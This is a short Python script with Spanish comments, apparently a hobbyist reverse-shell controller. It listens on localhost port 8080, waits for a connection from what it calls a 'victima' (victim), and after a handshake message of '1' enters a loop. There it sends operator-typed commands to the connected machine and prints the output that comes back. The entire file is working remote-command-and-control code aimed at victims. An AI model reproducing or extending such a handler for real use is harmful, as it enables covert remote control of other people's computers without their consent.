import socket

# Crear el servidor para que escuche 
server = socket.socket()
server.bind(("localhost", 8080))
server.listen(1)

# Bucle para esperarar una victima 
while True:
    # Variables para aceptar las concexiones de las victimas 
    victima, direccion = server.accept()

    print(f"concexion de {direccion}")

    # Obtener el mensaje de la victima en binario
    ms_binario = victima.recv(1024)

    # Codificar el mensaje 
    ms_codificado = ms_binario.decode("ascii")

    # Si el mensaje es igual a 1 
    if ms_codificado == "1":
        while True:
            opciones = input("shell@shell")

            # enviar a la victima los mensajes Codificados 
            victima.send(opciones.encode("ascii"))

            # Guardar el resultado en 2048 bytes 
            resultado = victima.recv(2048)

            print(resultado)
    else:
        print("Error...")
        break

